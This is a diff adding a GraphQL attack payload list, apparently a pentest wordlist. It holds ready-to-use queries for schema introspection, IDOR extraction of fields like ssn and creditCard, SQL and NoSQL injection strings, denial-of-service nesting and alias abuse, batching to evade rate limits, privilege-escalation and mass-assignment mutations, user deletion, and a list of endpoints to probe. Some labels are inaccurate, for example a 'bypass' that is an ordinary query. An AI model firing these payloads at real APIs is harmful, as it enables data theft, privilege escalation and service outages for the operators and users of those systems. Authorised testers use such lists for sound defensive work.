@@ -1,0 +1,256 @@
+# GraphQL Injection Payloads
+
+## ========================================
+## INTROSPECTION QUERIES
+## ========================================
+
+# Full Schema Dump
+{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}
+
+# Query Types
+{__schema{queryType{name,fields{name,description}}}}
+
+# Mutation Types
+{__schema{mutationType{name,fields{name,description}}}}
+
+# Subscription Types
+{__schema{subscriptionType{name,fields{name,description}}}}
+
+# Get All Type Names
+{__schema{types{name}}}
+
+# Detailed Type Information
+{__type(name:"User"){name,fields{name,type{name,kind}}}}
+
+## ========================================
+## INFORMATION DISCLOSURE
+## ========================================
+
+# Get Directives
+{__schema{directives{name,description,locations,args{name,description,type{name,kind,ofType{name,kind}}}}}}
+
+# Field Suggestions (Typo-based)
+{
+  __typname
+}
+# Error may reveal field names
+
+## ========================================
+## AUTHENTICATION BYPASS
+## ========================================
+
+# Array-based Bypass
+{
+  "query": "query { users { id name } }",
+  "variables": {}
+}
+
+# Batch Queries
+[
+  {"query": "query { user(id: 1) { name } }"},
+  {"query": "query { user(id: 2) { name } }"},
+  {"query": "query { user(id: 3) { name } }"}
+]
+
+## ========================================
+## IDOR VIA GRAPHQL
+## ========================================
+
+# Access Other Users
+{
+  user(id: 1) {
+    id
+    name
+    email
+    ssn
+    creditCard
+  }
+}
+
+# Enumerate Users
+{
+  users {
+    id
+    name
+    email
+    role
+  }
+}
+
+## ========================================
+## NOSQL INJECTION IN GRAPHQL
+## ========================================
+
+# MongoDB-style Injection
+{
+  users(where: {name: {_eq: "admin"}}) {
+    id
+    name
+    password
+  }
+}
+
+{
+  users(where: {name: {_regex: ".*"}}) {
+    id
+    name
+    email
+  }
+}
+
+## ========================================
+## SQL INJECTION IN GRAPHQL
+## ========================================
+
+# Union-based
+{
+  user(id: "1' UNION SELECT NULL--") {
+    name
+  }
+}
+
+# Boolean-based
+{
+  user(id: "1' AND '1'='1") {
+    name
+  }
+}
+
+## ========================================
+## DOS ATTACKS
+## ========================================
+
+# Circular Query (Infinite Loop)
+{
+  user {
+    posts {
+      author {
+        posts {
+          author {
+            posts {
+              author {
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# Deep Nesting
+{
+  a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{id}}}}}}}}}}}}}}}}}}}}}}}}}}
+}
+
+# Field Duplication
+{
+  user(id: 1) {
+    name name name name name name name name
+    email email email email email email email
+  }
+}
+
+# Alias Abuse
+{
+  u1: user(id: 1) { name }
+  u2: user(id: 2) { name }
+  u3: user(id: 3) { name }
+  # ... repeat 1000 times
+}
+
+## ========================================
+## BATCHING ATTACKS
+## ========================================
+
+# Multiple Queries
+[
+  {"query": "{ user(id: 1) { name } }"},
+  {"query": "{ user(id: 2) { name } }"},
+  {"query": "{ user(id: 3) { name } }"}
+  # ... up to rate limit
+]
+
+## ========================================
+## FIELD SUGGESTION / FUZZING
+## ========================================
+
+# Intentional Typos to Get Suggestions
+{
+  usr {
+    nam
+  }
+}
+# May return: "Did you mean 'user'? Did you mean 'name'?"
+
+## ========================================
+## MUTATION ATTACKS
+## ========================================
+
+# Privilege Escalation
+mutation {
+  updateUser(id: 1, role: "admin") {
+    id
+    role
+  }
+}
+
+# Mass Assignment
+mutation {
+  createUser(input: {
+    name: "attacker"
+    email: "attacker@evil.com"
+    role: "admin"
+    isVerified: true
+    balance: 999999
+  }) {
+    id
+    role
+  }
+}
+
+# Delete Operations
+mutation {
+  deleteUser(id: 1) {
+    success
+  }
+}
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Inline Fragments
+{
+  search(query: "test") {
+    ... on User {
+      id
+      password
+    }
+    ... on Admin {
+      secretKey
+    }
+  }
+}
+
+# Aliases to Bypass Field Limits
+{
+  a: users { id }
+  b: users { id }
+  c: users { id }
+}
+
+## ========================================
+## COMMON GRAPHQL ENDPOINTS
+## ========================================
+
+/graphql
+/graphiql
+/graphql/console
+/api/graphql
+/v1/graphql
+/v2/graphql
+/query
+/gql
+/__graphql
